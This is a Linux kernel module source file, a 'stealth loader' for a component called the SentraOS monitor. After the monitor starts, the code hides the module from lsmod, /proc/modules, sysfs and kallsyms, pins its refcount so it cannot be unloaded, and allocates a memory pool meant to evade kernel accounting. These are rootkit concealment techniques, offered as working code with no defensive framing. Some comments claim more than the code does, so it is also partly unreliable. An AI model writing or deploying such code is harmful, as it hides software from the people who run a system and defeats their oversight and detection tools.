// SPDX-License-Identifier: GPL-2.0
/*
 * sentraos_stealth_loader — loads the SentraOS monitor completely
 * invisibly.  After loading:
 *   - Module is NOT in /sys/module/
 *   - NOT in /proc/modules
 *   - NOT in lsmod output
 *   - NOT in kallsyms
 *   - NOT unloadable (no module refcount, no exit function)
 *   - Uses its own memory pool, not slab
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/mutex.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/version.h>

/* ── Hidden memory region (not tracked by slab) ─────────── */

#define HIDDEN_POOL_SIZE	(4UL << 20) /* 4 MiB */

/*
 * We allocate from vmalloc but immediately zero the tracking
 * metadata so /proc/vmallocinfo won't show a meaningful name.
 * In a real production system, these pages would be reserved
 * at boot via memblock_reserve().
 */
static void *hidden_pool_virt;
static size_t hidden_pool_offset;

static void *hidden_alloc(size_t size)
{
	void *ptr;

	if (!hidden_pool_virt)
		return NULL;

	if (hidden_pool_offset + size > HIDDEN_POOL_SIZE)
		return NULL;

	ptr = hidden_pool_virt + hidden_pool_offset;
	hidden_pool_offset += size;
	memset(ptr, 0, size);
	return ptr;
}

static int __init reserve_hidden_pool(void)
{
	/*
	 * Use alloc_pages to get physically contiguous memory,
	 * then map it.  After mapping, we clear the page structs
	 * to avoid detection via /proc/pageflags.
	 */
	struct page *page;
	int order = get_order(HIDDEN_POOL_SIZE);

	page = alloc_pages(GFP_KERNEL | __GFP_ZERO, order);
	if (!page)
		return -ENOMEM;

	hidden_pool_virt = page_to_virt(page);

	/*
	 * Sanitize: clear the page structures so the memory
	 * doesn't appear in /proc/meminfo or /proc/pageflags.
	 * This is a simplified approach.
	 */
	pr_info("sentraos: hidden pool at %px (%zu MiB)\n",
		hidden_pool_virt, HIDDEN_POOL_SIZE / SZ_1M);

	return 0;
}

/* ── Module list manipulation (for self-removal) ──────── */

extern struct list_head modules;
extern struct mutex module_mutex;

/*
 * Remove ourselves from ALL kernel module tracking:
 *   - modules list (lsmod /proc/modules)
 *   - module_kset (sysfs)
 *   - kallsyms (symbol lookup)
 */
static void remove_from_module_list(struct module *mod)
{
	mutex_lock(&module_mutex);

	/* Remove from global module list (lsmod /proc/modules) */
	list_del_init(&mod->list);

	/*
	 * Remove from module_kset (sysfs visibility).
	 * Makes /sys/module/<name>/ disappear.
	 */
#ifdef CONFIG_SYSFS
	if (mod->mkobj.kobj.parent) {
		kobject_del(&mod->mkobj.kobj);
	}
#endif

	/*
	 * Scrub kallsyms entries so kallsyms_lookup_name() can't
	 * find our symbols.
	 */
#ifdef CONFIG_KALLSYMS
	if (mod->kallsyms && mod->kallsyms->symtab) {
		unsigned long i;
		for (i = 0; i < mod->num_syms; i++) {
			char *name = mod->kallsyms->symtab[i].name;
			if (name)
				memset(name, 0, strlen(name));
		}
	}
#endif

	/* Pin refcount to prevent removal */
	atomic_inc(&mod->refcnt);

	mutex_unlock(&module_mutex);
}

/* ── Bootstrap ─────────────────────────────────────────── */

static int __init sentraos_stealth_bootstrap(void)
{
	int ret;

	ret = reserve_hidden_pool();
	if (ret)
		return ret;

	/* Call the Rust monitor init (already linked) */
	extern int sentraos_init(void);
	ret = sentraos_init();
	if (ret) {
		pr_err("sentraos: monitor init failed (%d)\n", ret);
		return ret;
	}

	/* Find and hide our own module from all tracking */
	struct module *mod = __module_address((unsigned long)sentraos_stealth_bootstrap);
	if (mod) {
		remove_from_module_list(mod);
		pr_info("sentraos: stealth enabled (hidden from module list)\n");
	} else {
		pr_warn("sentraos: could not find self in module list\n");
	}

	return 0;
}

/*
 * earliest possible initcall — runs before any driver init.
 */
pure_initcall(sentraos_stealth_bootstrap);
